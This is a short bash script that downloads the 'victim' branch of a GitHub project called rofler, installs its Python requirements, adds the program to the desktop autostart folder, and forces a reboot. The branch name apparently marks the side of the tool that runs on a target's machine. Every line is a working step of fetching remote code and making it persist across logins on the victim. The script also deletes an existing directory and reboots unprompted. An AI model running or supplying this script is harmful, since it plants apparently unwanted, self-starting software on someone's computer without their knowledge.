```bash
rm -rf ~/rofler
wget https://github.com/ImCocos/rofler/archive/refs/heads/victim.zip -P ~/;
unzip ~/victim.zip -d ~/;
rm ~/victim.zip;
mv ~/rofler-victim ~/rofler;
python -m venv ~/rofler/venv;
~/rofler/venv/bin/python -m pip install -r ~/rofler/requirements.txt;
mkdir ~/.config/autostart;
cp ~/rofler/rofler ~/.config/autostart/rofler;
systemctl reboot;
```